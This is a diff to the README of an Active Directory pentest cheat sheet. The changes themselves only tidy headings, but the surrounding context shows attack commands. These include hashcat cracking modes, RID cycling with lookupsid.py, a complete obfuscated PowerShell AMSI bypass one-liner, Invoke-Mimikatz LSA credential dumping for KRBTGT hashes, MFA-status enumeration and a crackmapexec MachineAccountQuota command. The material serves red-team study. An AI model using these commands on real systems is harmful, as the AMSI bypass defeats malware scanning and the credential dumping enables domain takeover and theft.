@@ -76,7 +76,7 @@ it is the first version of this repo, many things will be added later, so stay t
 
 ## Tools
 
-## Hash Cracking :
+## Hash Cracking
 
 LM :
 ```bash
@@ -130,9 +130,9 @@ hashcat -m 18200 -a 0 hash wordlist.txt --force
 
 note : some Hash Type in hashcat depend of the **etype**
 
-## Brutforce AD Password :
+## Brutforce AD Password 
 
-### Custom Username and Password wordlist :
+### Custom Username and Password wordlist 
 
 default password list (pwd_list) :
 ```sh
@@ -175,7 +175,7 @@ create custom usernames using username-anarchy :
 ```
 
 
-## RID Cycling :
+## RID Cycling 
 
 <a href="https://imgbb.com/"><img src="https://i.ibb.co/zPQ6ntJ/rid.png" alt="rid" border="0"></a>
   
@@ -189,9 +189,9 @@ lookupsid.py MEGACORP/$user:'$password'@$target 20000
 ```
 the value "20000" in lookupsid is to indicate how many RID will be tested
   
-## Enhanced Security Bypass:
+## Enhanced Security Bypass
 
-### AntiMalware Scan Interface :
+### AntiMalware Scan Interface 
 
 ```powershell
 sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
@@ -221,17 +221,17 @@ mimikatz # !-
 ```
 
 
-## MS Exhchange :
+## MS Exhchange 
 
-### Exchange User Enumeration :
-
-
-## Forest Persistence :
+### Exchange User Enumeration 
 
 
-## Cross Forest Attacks :
+## Forest Persistence 
 
-### Using KRBTGT hash :
+
+## Cross Forest Attacks 
+
+### Using KRBTGT hash 
 
 ```powershell
 Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
@@ -254,17 +254,17 @@ this command allow enumeration with MFA (MultiFactor Authentification)
 Get-MsolUser -EnabledFilter EnabledOnly -MaxResults 50000 | select DisplayName,UserPrincipalName,@{N="MFA Status"; E={ if( $_.StrongAuthenticationRequirements.State -ne $null){ $_. StrongAuthenticationRequirements.State} else { "Disabled"}}} | export-csv mfaresults.csv
 ```
 
-## Miscs :
+## Miscs 
 
-### Domain Level Attribute :
+### Domain Level Attribute 
 
-#### MachineAccountQuota (MAQ) Exploitation :
+#### MachineAccountQuota (MAQ) Exploitation 
 
 use crackmapexec (CME) with maq module :
 
 `cme ldap $dc -d $DOMAIN -u $USER -p $PASSWORD -M maq`
 
-### Abusing IPv6 in AD :
+### Abusing IPv6 in AD 
 
 scanning IPv6 address using nmap :
 
